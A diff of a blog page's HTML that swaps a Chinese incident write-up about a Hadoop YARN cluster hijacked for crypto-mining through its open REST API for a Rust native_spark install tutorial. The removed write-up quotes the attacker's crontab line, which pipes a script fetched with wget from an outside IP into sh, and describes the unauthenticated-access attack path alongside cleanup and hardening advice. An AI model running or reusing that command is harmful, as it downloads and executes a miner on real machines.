@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。">
-    <meta name="keywords" content="hadoop">
-    <title>yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</title>
+    <meta name="description" content="Native Spark for rust fast spark">
+    <meta name="keywords" content="fast spark native spark">
+    <title>Rust Native Spark Sample Install</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
     <style>
@@ -102,71 +102,82 @@
 </head>
 <body class="day-mode">
     <div class="metadata">
-        <p><strong>Title:</strong> yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application</p>
-        <p><strong>Categories:</strong> hadoop yarn hack</p>
-        <p><strong>Description:</strong> hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。</p>
-        <p><strong>Keywords:</strong> hadoop</p>
+        <p><strong>Title:</strong> Rust Native Spark Sample Install</p>
+        <p><strong>Categories:</strong> spark</p>
+        <p><strong>Description:</strong> Native Spark for rust fast spark</p>
+        <p><strong>Keywords:</strong> fast spark native spark</p>
     </div>
     <div class="content">
-        <p>简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。</p>
-<h3 id="_1">排问题</h3>
+        <p>本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。</p>
+<h3 id="native-spark-for-rust">介绍 Native Spark For Rust</h3>
 <ul>
-<li>
-<p>1. 集群检查</p>
-<p>今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
-<img alt="" src="/static/demos/7422da30-8014-41f6-a922-55f86a3ce252.png" />
-经过排查在<code>/tmp/ /var/tmp</code> 下面发现了 Java 还有tmp.txt
-内容如下：
-<img alt="" src="/static/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png" /></p>
-<p>服务器地址:<code>transfer.sh</code></p>
-</li>
-<li>
-<ol>
-<li>检查 <code>crontab -l</code> 发现了一个莫名其妙的 job
-    ```bash</li>
-<li>
+<li>github 地址 ： https://github.com/rajasekarv/native_spark</li>
+</ul>
+<h3 id="sample">Sample</h3>
+<pre class="codehilite"><code class="language-bash">## clone project 
+git clone https://github.com/rajasekarv/native_spark
+## Use Ubuntu18.04
+
+    curl -ssf https://sh.rustup.rs | sh  # 如果失败 curl https://sh.rustup.rs &gt; a.sh &amp;&amp; ./a.sh -y 强制执行
+     apt install openssl
+     apt install openssl-dev
+     apt install openssl-sys
+     apt install libssl-dev
+## clone capnproto 
+## 序列化工具包
+git clone https://github.com/sandstorm-io/capnproto.git
+cd capnproto
+sudo  apt install autoreconf
+sudo  apt install autoconf
+sudo  apt install automake
+sudo  apt install libtool
+autoreconf -i
+./configure 
+make -j4 check
+sudo make install 
+
+## 进入项目测试
+
+cd native_spark
+## 安装nightly 版本
+rustup install nightly
+## 强行覆盖一波
+rustup override set nightly
+## run example 
+cargo run --example make_rdd
+
+## cd native_spark/docker
+# build docker 镜像
+./build_image.sh
+# 启动测试节点 并且将当前的 target 目录映射到 容器内的 /home/dev
+./test_cluster.sh
+</code></pre>
+
+<h2 id="_1">图示</h2>
 <ul>
-<li>
+<li>看一下代码</li>
+</ul>
+<p><img alt="" src="/static/blog/2019-12-26-10-46-14.png" /></p>
 <ul>
-<li>
+<li>启动测试节点 </li>
+</ul>
+<p><img alt="" src="/static/blog/2019-12-26-10-47-39.png" /></p>
 <ul>
-<li>
+<li>进入Master</li>
+</ul>
+<p><img alt="" src="/static/blog/2019-12-26-10-48-47.png" /></p>
 <ul>
-<li>wget -q -O - http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1
-```</li>
+<li>测试native_spark</li>
 </ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="_2">解决办法</h3>
+<p><img alt="" src="/static/blog/2019-12-26-10-50-53.png" /></p>
 <ul>
-<li>
-<p>1，通过查看占用cpu高得进程，kill掉此进程</p>
-</li>
-<li>
-<p>2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</p>
-</li>
-<li>
-<p>3 ，通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1任务，删除此任务</p>
-</li>
-<li>
-<p>4，排查YARN日志，确认异常的application，删除处理</p>
-</li>
-<li>
-<p>5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。</p>
-</li>
-<li>
-<p>6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口</p>
-</li>
+<li>在容器内测试native_spark 集群 <code>./file_read --deployment_mode distributed --local_ip=0.0.0.0</code></li>
 </ul>
-<h4 id="_3">感谢老铁登科</h4>
+<pre class="codehilite"><code class="language-bash">RUST_BACKTRACE=full ./file_read --deployment_mode distributed --local_ip=0.0.0.0
+</code></pre>
+
+<p><img alt="" src="/static/blog/2019-12-26-11-07-11.png" /></p>
+<h4 id="_2">未完结</h4>
 <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
     </div>
     <footer>
